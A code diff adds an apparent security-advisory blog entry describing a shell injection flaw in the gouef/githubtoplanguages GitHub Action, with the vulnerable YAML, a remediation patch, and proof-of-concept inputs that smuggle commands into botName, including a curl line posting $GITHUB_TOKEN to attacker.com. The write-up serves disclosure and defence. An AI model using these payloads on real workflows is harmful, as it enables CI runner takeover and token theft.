@@ -52,6 +52,93 @@ export interface BlogPost {
 
 export const blogPosts: BlogPost[] = [
   {
+    slug: "ghsa-8rfq-rmx4-8qhr",
+    title: "Shell Injection via Composite Action Inputs in gouef/githubtoplanguages",
+    summary:
+      "A deep dive into discovering and responsibly disclosing a Critical shell command injection flaw in gouef/githubtoplanguages where ${{ inputs.* }} interpolation directly into run: scripts enables arbitrary remote command execution (RCE) on CI runners and GITHUB_TOKEN theft.",
+    publishedDate: "Sep 2026",
+    readTime: "7 min read",
+    category: "Security Advisory",
+    tags: ["Command Injection", "RCE", "GitHub Actions", "CI/CD Security", "CWE-78", "Supply Chain", "Disclosure"],
+    advisoryId: "GHSA-8rfq-rmx4-8qhr",
+    targetRepo: "gouef / githubtoplanguages",
+    severity: "Critical",
+    cwe: [
+      "CWE-77: Command Injection",
+      "CWE-78: OS Command Injection",
+      "CWE-94: Code Injection"
+    ],
+    patchedVersions: ["Review in progress / Pending patch"],
+    githubAdvisoryUrl: "https://github.com/gouef/githubtoplanguages/security/advisories/GHSA-8rfq-rmx4-8qhr",
+    overview:
+      "During security research into GitHub Actions composite actions, a critical command injection flaw was uncovered in gouef/githubtoplanguages (action.yml:64-67). The action constructed shell commands by embedding raw input expressions (${{ inputs.botName }} and ${{ inputs.botEmail }}) directly into run: script blocks without environment boundaries. An adversary supplying shell metacharacters could escape quotes, execute arbitrary commands with the privileges of the runner user, exfiltrate the repo GITHUB_TOKEN with contents: write access, or spawn an interactive reverse shell.",
+    timeline: [
+      { date: "3 weeks ago", event: "Vulnerability identified in action.yml string interpolation; reported privately to maintainer via GitHub Security Advisory." },
+      { date: "3 weeks ago", event: "Maintainer (@JanGalek) accepted the report, acknowledged CVSS Critical severity, and initiated CVE assignment request." },
+      { date: "2 weeks ago", event: "Follow-up coordinated disclosure exchanges between reporter (@madhanalagarsamy) and maintainer." },
+      { date: "2 weeks ago", event: "Official GitHub Security Advisory GHSA-8rfq-rmx4-8qhr published on GitHub Advisory Database as Critical severity." }
+    ],
+    vulnerabilityDetails: [
+      {
+        heading: "Vulnerable Code Pattern (action.yml:64-67)",
+        description:
+          "The composite action configures Git author details prior to committing updated language statistics. The raw input values are pasted directly into the run block without an intermediate environment variable boundary:",
+        codeSnippet: {
+          language: "yaml",
+          caption: "Vulnerable step in action.yml:64-67",
+          code: `- name: Set up Git\n  run: |\n    git config --global user.name "\${{ inputs.botName }}"\n    git config --global user.email "\${{ inputs.botEmail }}"\n  shell: bash`
+        }
+      },
+      {
+        heading: "Root Cause: Expression Preprocessing vs. Shell Execution",
+        description:
+          "${{ ... }} is a GitHub Actions expression preprocessing step: the runner evaluates the expression and textually splices the raw input string directly into the shell script file before bash ever parses it. Because the input sits within plain double quotes on its own line with no trailing syntax requirements, an attacker can break out of the quotes using \"; <arbitrary command>; echo \", leading to seamless execution without syntax errors."
+      }
+    ],
+    poc: {
+      description:
+        "The proof of concept confirmed arbitrary shell command execution, proof-of-compromise marker file generation, and credential exfiltration on the runner.",
+      steps: [
+        "Craft a workflow utilizing gouef/githubtoplanguages with an injection payload in botName: Jan\"; touch /tmp/GITHUB_BOTNAME_PWNED.txt; whoami; echo \"",
+        "Trigger the workflow via workflow_dispatch or pull request.",
+        "Observe the rendered command: git config --global user.name \"Jan\"; touch /tmp/GITHUB_BOTNAME_PWNED.txt; whoami; echo \"\"",
+        "Execution confirmed: /tmp/GITHUB_BOTNAME_PWNED.txt was created and whoami output the CI runner user.",
+        "Token exfiltration demonstration: Crafting payload botName: 'Jan\"; curl -X POST https://attacker.com/exfil -d \"$GITHUB_TOKEN\"; echo \"' sends the repository write token directly to attacker infrastructure."
+      ],
+      requestSnippet: {
+        language: "yaml",
+        caption: "PoC Exploit Workflow (action execution)",
+        code: `on: workflow_dispatch\njobs:\n  generate:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - uses: actions/checkout@v4\n      - uses: gouef/githubtoplanguages@main\n        with:\n          user: "JanGalek"\n          limit: 12\n          botName: 'Jan"; curl -X POST https://attacker.com/exfil -d "$GITHUB_TOKEN"; echo "'\n          botEmail: "bot@example.com"\n        env:\n          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}`
+      }
+    },
+    impact:
+      "Critical Severity (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H). The runner environment possesses GITHUB_TOKEN with contents: write permission, giving attackers immediate write access to the repository to push malicious commits, modify CI workflows, plant backdoors in release assets, or exfiltrate all secrets and private repository code. Downstream projects consuming this composite action inherit the vulnerability, creating an open-source supply chain attack vector.",
+    remediation:
+      "Never splice untrusted inputs directly into run: script bodies using ${{ ... }}. Instead, pass all inputs into the step's environment using an env: block, and reference them inside the bash script as quoted environment variables (\"$BOT_NAME\", \"$BOT_EMAIL\").",
+    patchDetails: {
+      description: "Secure mitigation using environment variables",
+      codeSnippet: {
+        language: "yaml",
+        caption: "Recommended remediation patch in action.yml",
+        code: `- name: Set up Git\n  env:\n    BOT_NAME: \${{ inputs.botName }}\n    BOT_EMAIL: \${{ inputs.botEmail }}\n  run: |\n    git config --global user.name "$BOT_NAME"\n    git config --global user.email "$BOT_EMAIL"\n  shell: bash`
+      }
+    },
+    references: [
+      {
+        title: "Official GitHub Security Advisory GHSA-8rfq-rmx4-8qhr",
+        url: "https://github.com/gouef/githubtoplanguages/security/advisories/GHSA-8rfq-rmx4-8qhr"
+      },
+      {
+        title: "GitHub Security Lab: Preventing Script Injection Attacks in Actions",
+        url: "https://securitylab.github.com/research/github-actions-preventing-pwn-requests/"
+      },
+      {
+        title: "CWE-78: Improper Neutralization of Special Elements used in an OS Command",
+        url: "https://cwe.mitre.org/data/definitions/78.html"
+      }
+    ]
+  },
+  {
     slug: "ghsa-9v52-vhvw-4w5c",
     title: "Cross-meeting presentation upload via unbound upload token (IDOR)",
     summary:
